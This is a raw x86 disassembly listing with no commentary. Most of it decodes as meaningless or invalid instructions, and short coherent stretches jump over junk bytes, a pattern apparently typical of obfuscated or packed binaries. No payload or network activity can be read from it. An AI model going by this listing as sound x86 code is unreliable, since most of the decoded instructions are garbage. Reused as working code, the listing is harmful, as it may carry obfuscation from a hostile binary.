  405145:	cmp    edx,DWORD PTR [edx+0x49]
  405148:	loope  0x40512f
  40514a:	popa   
  40514b:	inc    eax
  40514c:	push   eax
  40514d:	lahf   
  40514e:	cld    
  40514f:	cwde   
  405150:	jno    0x40512e
  405152:	push   eax
  405153:	rdpmc  
  405155:	push   ds
  405156:	xor    DWORD PTR [ebx-0x7c],0xffffff85
  40515a:	xor    eax,0x1ac02036
  40515f:	in     eax,0x7d
  405161:	daa    
  405162:	jl     0x40510d
  405164:	mov    edi,0x190bad15
  405169:	jnp    0x4051b3
  40516b:	scas   al,BYTE PTR es:[edi]
  40516c:	push   edx
  40516d:	les    ebp,FWORD PTR [ecx+0x3b1d5a1d]
  405173:	cmp    eax,esp
  405175:	add    DWORD PTR [esi-0x4c],edi
  405178:	mov    ds:0x15ec134e,eax
  40517d:	jnp    0x405125
  40517f:	mov    eax,0x8273c557
  405184:	dec    ebp
  405185:	ret    0x276c
  405188:	sar    BYTE PTR [eax+0x6320fb1d],cl
  40518e:	sub    esp,edi
  405190:	mov    ebx,0x1c57b611
  405195:	das    
  405196:	test   DWORD PTR [eax],0x14803176
  40519c:	in     al,dx
  40519d:	xor    dh,BYTE PTR [eax+0x627d4fcb]
  4051a3:	cmp    BYTE PTR [ebp+0x3913440f],cl
  4051a9:	in     eax,0x55
  4051ab:	mov    dl,0x38
  4051ad:	xchg   edi,eax
  4051ae:	mov    dh,0x57
  4051b0:	into   
  4051b1:	adc    eax,0x38fb1532
  4051b6:	and    eax,0x6cf240a6
  4051bb:	jl     0x4051ed
  4051bd:	mov    BYTE PTR [ecx+eiz*2+0x2],bl
  4051c1:	xor    BYTE PTR [eax],dl
  4051c3:	add    eax,0x2d1e05a7
  4051c8:	iret   
  4051c9:	ja     0x4051bc
  4051cb:	inc    ecx
  4051cc:	jns    0x405247
  4051ce:	pop    ds
  4051cf:	fisttp DWORD PTR [ecx]
  4051d1:	fild   WORD PTR [esp+ebx*1]
  4051d4:	add    BYTE PTR [ecx+edx*1-0x43c40f2],ch
  4051db:	mov    ah,0xf2
  4051dd:	int3   
  4051de:	inc    esp
  4051df:	retf   0x43f4
  4051e2:	pop    edi
  4051e3:	jmp    0x4051f5
  4051e5:	inc    BYTE PTR [eax]
  4051e7:	imul   esi,DWORD PTR [edi+0x7a41050a],0xffffff8d
  4051ee:	fwait
  4051ef:	in     al,0xb7
  4051f1:	and    esi,0xcd8b134
  4051f7:	stos   DWORD PTR es:[edi],eax
  4051f8:	rol    BYTE PTR [ebp+esi*1+0x5d28b8cc],1
  4051ff:	stc    
  405200:	(bad)  
  405201:	fld    DWORD PTR [ecx+0x64]
  405204:	fdivp  st(4),st
  405206:	push   esi
  405207:	adc    ebx,ebx
  405209:	iret   
  40520a:	push   ebp
  40520b:	xchg   esi,eax
  40520c:	mov    ds:0x9fea8780,al
  405211:	add    al,0x2f
  405213:	sub    cl,BYTE PTR [eax-0x4c]
  405216:	retf   0xdb45
  405219:	and    eax,0xa3698eff
  40521e:	inc    ebx
  40521f:	mov    ds:0x31d1fd5e,eax
  405224:	dec    ebx
  405225:	stos   BYTE PTR es:[edi],al
  405226:	loope  0x40525f
  405228:	adc    al,0x42
  40522a:	xor    eax,0x40db7a1d
  40522f:	jo     0x405267
  405231:	inc    eax
  405232:	mov    bh,0x35
  405234:	sbb    BYTE PTR [ecx-0x2a],ah
  405237:	repnz and bl,bh
  40523a:	call   0x96fb:0x17cc6b3d
  405241:	dec    edx
  405242:	or     ebx,DWORD PTR [ebp+0x4b6307ea]
  405248:	icebp  
  405249:	sti    
  40524a:	lods   eax,DWORD PTR ds:[esi]
  40524b:	dec    edx
  40524c:	or     BYTE PTR [eax+edx*1+0x36be9fed],0x70
  405254:	mov    esi,0x4b3b64c5
  405259:	loope  0x405201
  40525b:	jg     0x405246
  40525d:	nop
  40525e:	jge    0x4051ec
  405260:	sub    BYTE PTR ds:0x44cdfe34,0xd1
  405267:	idiv   DWORD PTR [ebp+0x14ae5835]
  40526d:	pop    ecx
  40526e:	jo     0x405214
  405270:	(bad)
  405273:	lock and cl,ch
  405276:	jg     0x405215
  405278:	mov    edx,0xc366f310
  40527d:	cmp    BYTE PTR [ebx-0x42add514],ah
  405283:	popa   
  405284:	shr    DWORD PTR [edi-0x24fcd0fa],cl
  40528a:	xchg   esi,eax
  40528b:	lods   al,BYTE PTR ds:[esi]
  40528c:	fild   QWORD PTR ds:0xf5cdf96f
  405292:	add    ecx,DWORD PTR [ebx]
  405294:	or     ebx,DWORD PTR [ebp+0x32]
  405297:	call   0x303d:0x9c508ae0
  40529e:	or     esp,eax
  4052a0:	inc    eax
  4052a1:	aaa    
  4052a2:	push   cs
  4052a3:	mov    BYTE PTR [ebp*1+0x63cd0bf],dh
  4052aa:	in     al,dx
  4052ab:	iret   
  4052ac:	xor    BYTE PTR [ebp+ecx*4-0x42],dl
  4052b0:	jbe    0x40531e
  4052b2:	fisub  DWORD PTR [ebp-0x20]
  4052b5:	xchg   ebp,eax
  4052b6:	je     0x405257
  4052b8:	adc    ch,0x8d
  4052bb:	mov    dh,0x1c
  4052bd:	sti    
  4052be:	retf   0x6cfd
  4052c1:	sbb    al,0xe3
  4052c3:	adc    al,ch
  4052c5:	mov    eax,ds:0xaa445305
  4052ca:	in     eax,0x1e
  4052cc:	adc    ebp,edi
  4052ce:	aam    0x95
  4052d0:	xor    esi,edx
  4052d2:	add    eax,ecx
  4052d4:	add    esi,ecx
  4052d6:	imul   eax,esi
  4052d9:	jmp    0x40559d
  4052de:	mov    eax,DWORD PTR [ebp+0xc]
  4052e1:	mov    eax,DWORD PTR [eax+0x78]
  4052e4:	mov    DWORD PTR [ebp+0xc],eax
  4052e7:	mov    eax,DWORD PTR [ebp-0x4]
  4052ea:	mov    esi,DWORD PTR [ebp-0x8]
  4052ed:	xor    eax,edx
  4052ef:	xor    esi,edx
  4052f1:	add    eax,ecx
  4052f3:	jmp    0x405577
  4052f8:	shl    DWORD PTR [ebx],0xe4
  4052fb:	add    al,0xe2
  4052fd:	ret    
  4052fe:	loope  0x4052e1
  405300:	and    esp,DWORD PTR [eax+0x3e910108]
  405306:	lods   al,BYTE PTR ds:[esi]
  405307:	jnp    0x4052cf
  405309:	sub    dh,BYTE PTR [eax+0x70]
  40530c:	fnstcw WORD PTR [esi+0x70]
  40530f:	jo     0x405386
  405311:	rol    edi,0x2
  405314:	ror    DWORD PTR [ebx],cl
  405316:	adc    edi,DWORD PTR ds:[eax-0x76]
  40531a:	inc    edx
  40531b:	repnz jmp 0xff34:0x3235d135
  405323:	test   DWORD PTR [ebp-0x33],esi
  405326:	gs (bad) 
  405328:	retf   0x414b
  40532b:	sbb    al,0xe3
  40532d:	(bad)  
  40532e:	jp     0x4052f9
  405330:	mov    bl,0xe0
  405332:	imul   esp,DWORD PTR [edx+0x354f912d],0xfffffff2
  405339:	jle    0x405329
  40533b:	adc    ebx,ecx
  40533d:	sar    DWORD PTR [ebx],1
  40533f:	pop    edx
  405340:	and    eax,0x5f05e84d
  405345:	aaa    
  405346:	sub    BYTE PTR [eax+0x2b],bh
  405349:	or     al,0xd6
  40534b:	jne    0x4053cb
  40534d:	cmp    eax,0xf55baf13
  405352:	ds fwait
  405354:	dec    esp
  405355:	out    dx,al
  405356:	jne    0x405338
  405358:	xchg   edi,eax
  405359:	out    0x29,al
  40535b:	fwait
  40535c:	sub    eax,0x7fe89324
  405361:	lea    edx,[ecx-0x83797b7]
  405367:	mov    al,ds:0x4f8f7a3b
  40536c:	adc    al,0xba
  40536e:	inc    esi
  40536f:	fcom   QWORD PTR [edx-0xccc33f8]
  405375:	mov    DWORD PTR [edi+eax*1+0x20dc78a3],ebx
  40537c:	aas    
  40537d:	call   0xa1b4:0x109ed37f
  405384:	xor    BYTE PTR [esi],0xc3
  405387:	retf   
  405388:	les    edi,FWORD PTR [ebp-0x1738b2e9]
  40538e:	mov    ebp,0xb4e3e5fa
  405393:	lods   al,BYTE PTR ds:[esi]
  405394:	dec    ebx
  405395:	ins    DWORD PTR es:[edi],dx
  405396:	call   0x9ebe817f
  40539b:	loop   0x405392
  40539d:	or     al,0x5f
  40539f:	cmp    bl,bh
  4053a1:	mov    ah,0xb6
  4053a3:	mov    dh,0x9
  4053a5:	adc    eax,edi
  4053a7:	xchg   ebp,eax
  4053a8:	sahf   
  4053a9:	mov    esp,0xc16b2c9f
  4053ae:	push   ds
  4053af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4053b0:	idiv   DWORD PTR [esi+0x56ffee57]
  4053b6:	aas    
  4053b7:	shl    BYTE PTR [edx+0x25],0xa5
  4053bb:	fs cmp al,0x21
  4053be:	add    al,0x18
  4053c0:	pop    es
  4053c1:	mov    dl,0x73
  4053c3:	dec    ecx
  4053c4:	mov    ebx,0x532b343d
  4053c9:	cs xchg edi,eax
  4053cb:	out    dx,al
  4053cc:	mov    dh,0x3d
  4053ce:	mov    eax,ds:0xe5726cb8
  4053d3:	pusha  
  4053d4:	xchg   esp,eax
  4053d5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4053d6:	jg     0x405398
  4053d8:	add    eax,0xe5e2b2b
  4053dd:	sub    al,0xbc
  4053df:	frstor [edx+0x1d]
  4053e2:	sbb    al,0x1
  4053e4:	adc    DWORD PTR ds:0x8af6108d,0xffffffb6
  4053eb:	pop    ecx
  4053ec:	jne    0x40540c
  4053ee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4053ef:	sti    
  4053f0:	jbe    0x4053cb
  4053f2:	movq   mm4,QWORD PTR [ecx+0x36]
  4053f6:	push   edi
  4053f7:	call   0x9192a042
  4053fc:	add    dh,BYTE PTR [esi]
  4053fe:	in     al,0x2e
  405400:	push   ecx
  405401:	add    BYTE PTR [esp+ecx*1],ch
  405404:	mov    esi,0x75a28788
  405409:	loopne 0x4053fd
  40540b:	adc    al,0x83
  40540d:	daa    
  40540e:	xor    BYTE PTR [edx+0x3c242918],bh
  405414:	lahf   
  405415:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405416:	and    bh,BYTE PTR [ebx-0x3e]
  405419:	add    eax,0xd7b54645
  40541e:	int3   
  40541f:	xor    al,0x29
  405421:	or     eax,0x7d08b013
  405426:	push   ebx
  405427:	icebp  
  405428:	fwait
  405429:	jg     0x405436
  40542b:	(bad)  
  40542c:	xor    DWORD PTR [esi+edi*8+0x3aa34b3d],ebp
  405433:	lock and bl,al
  405436:	iret   
  405437:	(bad)
  40543b:	int    0x3c
  40543d:	(bad)  
  40543e:	dec    ebp
  405440:	jl     0x40549e
  405442:	jge    0x4054b4
  405444:	push   ebp
  405445:	call   DWORD PTR [ebp-0x28e77b10]
  40544b:	or     eax,0xdaa165b
  405450:	ja     0x405422
  405452:	aad    0xb4
  405454:	(bad)  
  405455:	dec    ebx
  405456:	pop    esi
  405457:	mov    bl,0x55
  405459:	test   DWORD PTR [esi],edi
  40545b:	int    0x83
  40545d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40545e:	mov    bl,0x39
  405460:	test   BYTE PTR [ebx-0x65c592f7],bh
  405466:	mov    dh,0x45
  405469:	rcr    BYTE PTR [esi-0x7c],cl
  40546c:	pusha  
  40546d:	idiv   DWORD PTR [edi-0x2c6d3db1]
  405473:	ror    DWORD PTR [eax],cl
  405475:	cli    
  405476:	cs out dx,eax
  405478:	pop    ebp
  405479:	mov    esp,0xee37fd6c
  40547e:	add    BYTE PTR [eax-0x68],ch
  405481:	(bad)  
  405482:	shl    DWORD PTR [edx-0x7dfefb4a],cl
  405488:	xor    eax,0x71e4e88d
  40548d:	mov    bh,0xd2
  40548f:	jmp    0x40542a
  405491:	adc    BYTE PTR [eax+0x3a],ch
  405494:	sbb    dl,cl
  405496:	sub    eax,0xfed794e4
  40549b:	push   esp
  40549c:	pop    ebx
  40549d:	adc    eax,0x5e32ca9a
  4054a2:	pushf  
  4054a3:	xchg   ebx,eax
  4054a4:	fldenv [eax+0x69]
  4054a7:	js     0x4054a8
  4054a9:	jmp    0x71b3:0xdc959c49
  4054b0:	jae    0x40548c
  4054b2:	aaa    
  4054b3:	xor    al,0x29
  4054b5:	enter  0x7a91,0x53
  4054b9:	aam    0x85
  4054bb:	mov    dl,0xbb
  4054bd:	push   ebx
  4054be:	popaw  
  4054c0:	mov    edx,0x11f654bc
  4054c5:	clc    
  4054c6:	ret    
  4054c7:	cmp    BYTE PTR ds:0xa718a86c,bl
  4054cd:	aad    0xc1
  4054cf:	mov    ch,0xf1
  4054d1:	xor    edi,DWORD PTR [esi+0x2d]
  4054d4:	js     0x405461
  4054d6:	sub    edi,edx
  4054d8:	test   BYTE PTR [esi],bh
  4054da:	je     0x4054e1
  4054dc:	out    dx,eax
  4054dd:	dec    eax
  4054de:	out    0xb1,eax
  4054e0:	xchg   ebx,eax
  4054e1:	cli    
  4054e2:	repz adc cl,ah
  4054e5:	mov    esp,0x2d20def0
  4054ea:	add    eax,0xa2207f61
  4054ef:	retf   
  4054f0:	dec    ebp
  4054f1:	cmp    eax,0x78b134b9
  4054f6:	outs   dx,BYTE PTR ds:[esi]
  4054f7:	rcr    BYTE PTR [ecx+0x41564c2b],0x6d
  4054fe:	mov    ?,WORD PTR [ebp-0x4bb0b543]
  405504:	cmp    DWORD PTR [esi],ebx
  405506:	stos   BYTE PTR es:[edi],al
  405507:	ins    DWORD PTR es:[edi],dx
  405508:	in     eax,dx
  405509:	adc    DWORD PTR [eax+ebx*1+0x586c9471],0xffffffd0
  405511:	add    BYTE PTR [edi-0x77],al
  405514:	add    BYTE PTR [ecx-0x17e35fbd],ch
  40551a:	jge    0x405563
  40551c:	jno    0x4054a5
  40551e:	and    DWORD PTR [edx],esp
  405520:	jl     0x4054b6
  405522:	ss das 
  405524:	int3   
  405525:	scas   al,BYTE PTR es:[edi]
  405526:	dec    esp
  405527:	repnz dec edx
  405529:	(bad)  
  40552a:	sub    ecx,eax
  40552c:	or     esi,ecx
  40552e:	ja     0x405579
  405530:	sub    BYTE PTR [ebx],cl
  405532:	inc    ebp
  405533:	fistp  DWORD PTR [edi]
  405535:	(bad)  
  405536:	ja     0x405565
  405538:	or     DWORD PTR ds:0xf77f003f,esi
  40553e:	and    eax,0x88c798a3
  405543:	fisubr WORD PTR [ecx-0x22af6129]
  405549:	fwait
  40554a:	out    0x33,eax
  40554c:	shr    DWORD PTR [ebx-0x2390cd93],cl
  405552:	mov    edx,0x37288eda
  405557:	mov    ds:0xd5597ecc,eax
  40555c:	push   es
  40555d:	ret    0x4575
  405560:	inc    esi
  405561:	fmul   st(2),st
  405563:	gs push esp
  405565:	retf   
  405566:	call   0xfe:0x69877c69
  40556d:	cli    
  40556e:	adc    eax,0x83b60e04
  405573:	sbb    eax,0x3d711c9
  405578:	icebp  
  405579:	imul   eax,esi
  40557c:	mov    esi,DWORD PTR [ebp+0xc]
  40557f:	cmp    esi,eax
  405581:	mov    eax,DWORD PTR [ebp-0x4]
  405584:	je     0x405047
  40558a:	xor    eax,edx
  40558c:	add    eax,ecx
  40558e:	mov    ecx,DWORD PTR [ebp+0xc]
  405591:	imul   eax,ecx
  405594:	add    eax,DWORD PTR [ebp+0x8]
  405597:	mov    DWORD PTR [ebp+0xc],eax
  40559a:	mov    eax,DWORD PTR [ebp+0xc]
  40559d:	pop    esi
  40559e:	leave  
  40559f:	ret    0x8
  4055a2:	push   ebp
  4055a3:	mov    ebp,esp
  4055a5:	push   ecx
  4055a6:	mov    DWORD PTR [ebp-0x4],0xf89c853d
  4055ad:	mov    eax,DWORD PTR [ebp-0x4]
  4055b0:	mov    edx,DWORD PTR [ebp+0x10]
  4055b3:	mov    ecx,0x7510855
  4055b8:	adc    DWORD PTR ds:0x434421,0x21da
  4055c2:	xor    eax,ecx
  4055c4:	add    eax,0x32729c
  4055c9:	and    DWORD PTR ds:0x4326fc,0x2b83
  4055d3:	mov    DWORD PTR [edx],eax
  4055d5:	mov    eax,ds:0x434439
  4055da:	mov    edx,DWORD PTR ds:0x43445d
  4055e0:	sub    eax,edx
  4055e2:	xor    eax,DWORD PTR [eax+edx*1]
  4055e5:	mov    eax,DWORD PTR [ebp+0xc]
  4055e8:	dec    edx
  4055e9:	xor    eax,ecx
  4055eb:	dec    edx
  4055ec:	jmp    0x405755
  4055f1:	loope  0x4055fe
  4055f3:	xchg   edi,eax
  4055f4:	fdiv   DWORD PTR [ebp+0x64]
  4055f7:	jno    0x405602
  4055f9:	add    DWORD PTR [edi-0x74],0xb9669a84
  405600:	inc    esi
  405601:	scas   eax,DWORD PTR es:[edi]
  405602:	sub    BYTE PTR [eax+0x70],dh
  405605:	les    edi,FWORD PTR [edi+0x70]
  405608:	jo     0x405676
  40560a:	pop    edx
  40560b:	leave  
  40560c:	xchg   BYTE PTR [ecx-0x49],bh
  40560f:	popf   
  405610:	maxps  xmm6,XMMWORD PTR [eax+0x6595ef2]
  405617:	fldenv [esi-0x412929b7]
  40561d:	mov    al,0x7b
  40561f:	push   ebp
  405620:	pop    edx
  405621:	sub    al,0x4e
  405623:	dec    esi
  405624:	dec    edi
  405625:	out    dx,eax
  405626:	push   ecx
  405627:	ins    BYTE PTR es:[edi],dx
  405628:	fsub   DWORD PTR [ebp+0x4a]
  40562b:	push   esp
  40562c:	pop    esi
  40562d:	mov    ebp,0x38ed1148
  405632:	daa    
  405633:	xchg   esp,eax
  405634:	pop    ebx
  405635:	aad    0xa0
  405637:	mov    ebp,0x70a189a4
  40563c:	or     eax,DWORD PTR [edx]
  40563e:	popf   
  40563f:	pop    edi
  405640:	dec    edi
  405641:	push   ecx
  405642:	dec    edi
  405643:	leave  
  405644:	pop    ecx
  405645:	cs mov ecx,0xd02e696b
  40564b:	idiv   DWORD PTR [ebp+0x6d]
  40564e:	xlat   BYTE PTR ds:[ebx]
  40564f:	test   eax,0x248a0c29
  405654:	push   edx
  405655:	mov    cl,0xd4
  405657:	xor    al,0x77
  405659:	push   cs
  40565a:	xchg   esp,eax
  40565b:	jbe    0x4056a3
  40565d:	popf   
  40565e:	sub    bl,cl
  405660:	mov    ebx,0xdb473c9d
  405665:	xor    esi,ebx
  405667:	xor    DWORD PTR [eax-0x14],0x34
  40566b:	jae    0x4056ca
  40566d:	fyl2x  
  40566f:	inc    edi
  405670:	std    
  405671:	sbb    eax,0x319eada0
  405676:	jmp    DWORD PTR [ebx-0x1dde9c23]
  40567c:	scas   al,BYTE PTR es:[edi]
  40567d:	outs   dx,BYTE PTR ds:[esi]
  40567e:	mov    ecx,0xc2897a34
  405683:	mov    ch,dh
  405685:	std    
  405686:	xor    BYTE PTR [edx-0x6e],bh
  405689:	sbb    edx,DWORD PTR [ebx+0x2967b4ab]
  40568f:	inc    eax
  405690:	jne    0x4056bf
  405692:	push   ss
  405693:	add    BYTE PTR [ebp+0x6c],cl
  405696:	jbe    0x4056d8
  405698:	pusha  
  405699:	test   DWORD PTR [ebp+0xb],eax
  40569c:	shl    BYTE PTR [eax],0x6d
  40569f:	ins    DWORD PTR es:[edi],dx
  4056a0:	stos   DWORD PTR es:[edi],eax
  4056a1:	test   BYTE PTR [edi-0x41acda5],dl
  4056a7:	add    al,0x4e
  4056a9:	inc    esi
  4056aa:	cmp    DWORD PTR ds:0x764db68,0x4a49ce55
  4056b4:	add    eax,0x3663c46a
  4056b9:	ret    
  4056ba:	(bad)  
  4056bb:	sbb    bl,BYTE PTR [ebx+edx*8]
  4056be:	or     BYTE PTR [edx-0x46],0x69
  4056c2:	mov    al,0x98
  4056c4:	out    0x9,al
  4056c6:	jbe    0x405694
  4056c8:	pop    esi
  4056c9:	inc    esi
  4056ca:	out    dx,eax
  4056cb:	test   BYTE PTR [edx+0x28],al
  4056ce:	jmp    0x61d408e4
  4056d3:	pop    ebx
  4056d4:	mov    edi,0xca916fd
  4056d9:	stc    
  4056da:	imul   ecx,DWORD PTR [ebx+0x20],0x108df9aa
  4056e1:	ja     0x40573d
  4056e3:	jg     0x4056fa
  4056e5:	mov    cl,0x64
  4056e7:	out    0x25,eax
  4056e9:	mov    al,ds:0x27643478
  4056ee:	add    edx,DWORD PTR [edx+0x68]
  4056f1:	sbb    eax,0xa775cfcd
  4056f6:	leave  
  4056f7:	push   esp
  4056f8:	cdq    
  4056f9:	push   0x28fbc0c6
  4056fe:	stos   BYTE PTR es:[edi],al
  4056ff:	ret    0x9aa1
  405702:	jl     0x40572f
  405704:	jns    0x405780
  405706:	ds pop esi
  405708:	lea    esi,[eax-0x173bc7bd]
  40570e:	dec    edi
  40570f:	rcl    DWORD PTR [ebp+0x7],cl
  405712:	call   0x8377f311
  405717:	sub    ch,BYTE PTR [esp+esi*2-0x74bb4d0c]
  40571e:	push   es
  40571f:	imul   esp,DWORD PTR ds:[ecx],0x979b9ca3
  405726:	stos   DWORD PTR es:[edi],eax
  405727:	mov    esp,0x3ddda5d4
  40572c:	clc    
  40572d:	into   
  40572e:	mov    dl,0x87
  405730:	jae    0x405731
  405732:	dec    ebp
  405733:	mov    eax,ds:0xcfaa0357
  405738:	cmp    edi,DWORD PTR [ebx-0x3e]
  40573b:	ins    BYTE PTR es:[edi],dx
  40573c:	iret   
  40573d:	in     al,dx
  40573e:	mov    ds,edi
  405740:	mov    ds:0xca6f9097,al
  405745:	sub    eax,0xa8241727
  40574a:	data16 cmc 
  40574c:	in     eax,dx
  40574d:	dec    ecx
  40574e:	(bad)  
  40574f:	pop    edi
  405750:	jge    0x4057ad
  405752:	arpl   WORD PTR [edi+0x758b56d6],di
  405758:	adc    BYTE PTR [ecx+0x43436a25],al
  40575e:	add    BYTE PTR [eax],al
  405760:	add    BYTE PTR [eax],al
  405762:	add    BYTE PTR [ebx+0x43436a15],cl
  405768:	add    BYTE PTR [edx-0x77],al
  40576b:	adc    eax,0x43436a
  405770:	cmp    DWORD PTR ds:0x43436a,0x22
  405777:	jne    0x405789
  40577d:	push   DWORD PTR [ebp-0xc]
  405780:	push   DWORD PTR [ebp-0x24]
  405783:	call   DWORD PTR ds:0x4329c2
  405789:	cmp    DWORD PTR ds:0x43436a,0x1c
  405790:	jb     0x405763
  405796:	mov    edx,0x32729c
  40579b:	adc    DWORD PTR ds:0x432dbe,0x43438a
  4057a5:	add    eax,edx
  4057a7:	mov    DWORD PTR [esi+0x4],eax
  4057aa:	movzx  eax,BYTE PTR ds:0x4326f4
  4057b1:	and    eax,DWORD PTR ds:0x43439a
  4057b7:	mov    ds:0x4326f4,eax
  4057bc:	mov    eax,DWORD PTR [ebp+0x14]
  4057bf:	mov    DWORD PTR ds:0x43437e,0x718d
  4057c9:	mov    esi,DWORD PTR [ebp+0x10]
  4057cc:	xor    DWORD PTR ds:0x432704,0x2330
  4057d6:	mov    DWORD PTR [esi+0x8],eax
  4057d9:	mov    eax,DWORD PTR [ebp+0x18]
  4057dc:	mov    esi,DWORD PTR [ebp+0x10]
  4057df:	mov    DWORD PTR [esi+0xc],eax
  4057e2:	mov    eax,DWORD PTR [ebp+0x1c]
  4057e5:	mov    esi,DWORD PTR [ebp+0x10]
  4057e8:	mov    DWORD PTR [esi+0x10],eax
  4057eb:	mov    eax,eax
  4057ed:	jmp    0x405956
  4057f2:	hlt    
  4057f3:	and    BYTE PTR [ecx],bl
  4057f5:	arpl   cx,sp
  4057f7:	jno    0x40586b
  4057f9:	scas   eax,DWORD PTR es:[edi]
  4057fa:	mov    al,ds:0x1b519e0f
  4057ff:	mov    eax,DWORD PTR [eax+0x7037738c]
  405805:	jo     0x4057cb
  405807:	jg     0x405879
  405809:	jo     0x405830
  40580b:	mov    ?,esp
  40580d:	mov    al,ds:0xe5d94c8c
  405812:	(bad)  
  405814:	je     0x40579c
  405816:	mov    bl,0xb9
  405818:	sahf   
  405819:	aad    0xa9
  40581b:	aaa    
  40581c:	sbb    esp,edx
  40581e:	jmp    0x4763a8ea
  405823:	jg     0x405838
  405825:	lds    edi,FWORD PTR [ecx]
  405827:	jo     0x405891
  405829:	jle    0x405845
  40582b:	inc    edi
  40582c:	loope  0x40584e
  40582e:	xor    esp,DWORD PTR [edi]
  405830:	inc    DWORD PTR [edx]
  405832:	mov    ch,0x14
  405834:	push   ebx
  405835:	out    dx,al
  405836:	sub    DWORD PTR [esi+0x4f72c156],edx
  40583c:	sbb    ah,BYTE PTR [edi-0x43f636fe]
  405842:	inc    esi
  405843:	scas   eax,DWORD PTR es:[edi]
  405844:	popf   
  405845:	sbb    bh,al
  405847:	or     eax,0xb61570c5
  40584c:	call   0x3a71:0x3ce851bc
  405853:	dec    esi
  405854:	leave  
  405855:	sbb    DWORD PTR [edx+ecx*1-0x19],esp
  405859:	pop    ecx
  40585a:	mov    ch,BYTE PTR [eax]
  40585c:	add    BYTE PTR [edx-0x1c],bh
  40585f:	push   edx
  405860:	sbb    DWORD PTR gs:[eax+eax*4],esi
  405864:	jmp    0x89ce:0xc9eb5f1f
  40586b:	sub    esp,ecx
  40586d:	dec    esp
  40586e:	pop    ss
  40586f:	pop    ss
  405870:	xchg   ebp,eax
  405871:	fld    DWORD PTR ss:0x60f0b3bb
  405878:	inc    edi
  405879:	push   0xc4f10df8
  40587e:	mov    esp,0x292c6f2d
  405883:	adc    dl,ch
  405885:	or     eax,0xd49ac03c
  40588a:	rcr    BYTE PTR [edi-0x5],cl
  40588d:	rol    BYTE PTR [ecx-0x97a51ff],1
  405893:	mov    dh,0xf3
  405895:	push   eax
  405896:	and    cl,BYTE PTR [edi-0x511db3fb]
  40589c:	xchg   dl,bl
  40589e:	test   BYTE PTR [ebx-0x507fd849],dh
  4058a4:	js     0x40589e
  4058a6:	pop    ebp
  4058a7:	mov    BYTE PTR [ebp-0x10],cl
  4058aa:	push   ebp
  4058ab:	and    DWORD PTR [ecx-0x19e87de2],ebx
  4058b1:	sbb    al,0xde
  4058b3:	inc    esp
  4058b4:	ror    DWORD PTR [edx+0x89e891f],1
  4058ba:	pushf  
  4058bb:	inc    ebx
  4058bc:	inc    ecx
  4058bd:	jno    0x405913
  4058bf:	shl    DWORD PTR [ebx+ebp*2],0xe1
  4058c3:	into   
  4058c4:	(bad)  
  4058c5:	test   BYTE PTR [eax-0x76668d4f],0x92
  4058cc:	ret    
  4058cd:	xchg   esp,eax
  4058ce:	jbe    0x4058b9
  4058d0:	or     ch,BYTE PTR [ecx-0x1ac2be0a]
  4058d6:	adc    BYTE PTR [edx],bl
  4058d8:	xlat   BYTE PTR ds:[ebx]
  4058d9:	jle    0x4058ce
  4058db:	fwait
  4058dc:	dec    edi
  4058dd:	out    dx,eax
  4058de:	rcl    BYTE PTR ds:0xc2a03350,cl
  4058e4:	inc    esp
  4058e5:	fwait
  4058e6:	pop    ss
  4058e7:	sub    eax,0x30125535
  4058ec:	cmp    ah,dl
  4058ee:	mov    ebp,0x79a6766c
  4058f3:	sti    
  4058f4:	cmp    bl,BYTE PTR [ecx]
  4058f6:	(bad)  
  4058f8:	dec    ecx
  4058f9:	enter  0xb989,0x6c
  4058fd:	jno    0x40593e
  4058ff:	mov    BYTE PTR [edi],cl
  405901:	push   es
  405902:	iret   
  405903:	xor    edx,DWORD PTR [esi+0x6a]
  405906:	and    ebp,DWORD PTR ds:0xb16bbd21
  40590c:	inc    esp
  40590d:	cld    
  40590e:	push   es
  40590f:	sbb    ebx,DWORD PTR [edi+0x574afa66]
  405915:	and    DWORD PTR ds:0x2e292db4,0x73212a3c
  40591f:	mov    eax,0xefbf26ca
  405924:	jle    0x405949
  405926:	xor    esi,0xa8e6852e
  40592c:	lahf   
  40592d:	xchg   DWORD PTR [edi],ebx
  40592f:	and    al,0xb
  405931:	mov    ds:0x64cd843b,al
  405936:	pusha  
  405937:	jb     0x405981
  405939:	xlat   BYTE PTR ds:[ebx]
  40593a:	sbb    DWORD PTR [edx+0x23],eax
  40593d:	retf   
  40593e:	inc    esi
  40593f:	dec    eax
  405940:	inc    esi
  405941:	ins    BYTE PTR es:[edi],dx
  405942:	xor    dh,BYTE PTR [edx-0x60]
  405945:	fdivr  DWORD PTR [edi]
  405947:	pop    edi
  405948:	scas   al,BYTE PTR es:[edi]
  405949:	mov    WORD PTR [ecx],?
  40594b:	out    dx,al
  40594c:	push   ebx
  40594d:	mov    fs,WORD PTR [ebx+0x1a]
  405950:	fcmovne st,st(0)
  405952:	jge    0x405946
  405954:	sbb    DWORD PTR [edi-0x75],edi
  405957:	inc    ebp
  405958:	or     BYTE PTR [ebx],dh
  40595a:	rol    DWORD PTR [ebx],0xc2
  40595d:	pop    esi
  40595e:	leave  
  40595f:	ret    0x18
  405962:	push   ebp
  405963:	mov    ebp,esp
  405965:	mov    eax,DWORD PTR [ebp+0xc]
  405968:	xor    edx,edx
  40596a:	jmp    0x405ad3
  40596f:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  405971:	sub    esi,DWORD PTR [esi+0x7161b2eb]
  405977:	mov    ah,0xc8
  405979:	mov    esi,0x3b8a4511
  40597e:	pop    edx
  40597f:	(bad)  
  405980:	xor    eax,0x7fc47070
  405985:	jo     0x4059f7
  405987:	clc    
  405988:	inc    edi
  405989:	add    al,0xa3
  40598b:	ret    0xeef
  40598e:	or     al,0xae
  405990:	fiadd  WORD PTR [edx-0x5c]
  405993:	mov    al,0xbf
  405995:	js     0x4059b1
  405997:	dec    ecx
  405998:	outs   dx,DWORD PTR ds:[esi]
  405999:	in     al,dx
  40599a:	in     al,0xb3
  40599c:	test   dh,dl
  40599e:	ss mov ah,0xf2
  4059a1:	adc    DWORD PTR [bx+di-0x1e15],esi
  4059a6:	pop    esi
  4059a7:	lahf   
  4059a8:	sahf   
  4059a9:	in     eax,dx
  4059aa:	dec    ebx
  4059ab:	mov    ebx,0x5af90136
  4059b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
